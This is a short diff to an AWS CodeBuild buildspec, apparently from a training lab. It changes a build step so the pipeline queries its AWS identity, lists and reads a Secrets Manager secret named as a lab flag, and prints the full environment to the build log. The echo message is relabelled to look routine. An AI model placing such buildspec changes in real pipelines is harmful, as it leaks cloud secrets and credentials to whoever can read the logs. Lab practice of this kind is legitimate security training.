@@ -3,6 +3,9 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
+      - echo "Running build"
+      - aws sts get-caller-identity
+      - aws secretsmanager list-secrets --region us-east-1 --query "SecretList[?contains(Name,'codebuild_lab_5')].Name" --output text
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text || true
+      - env | sort
       - echo "Done"
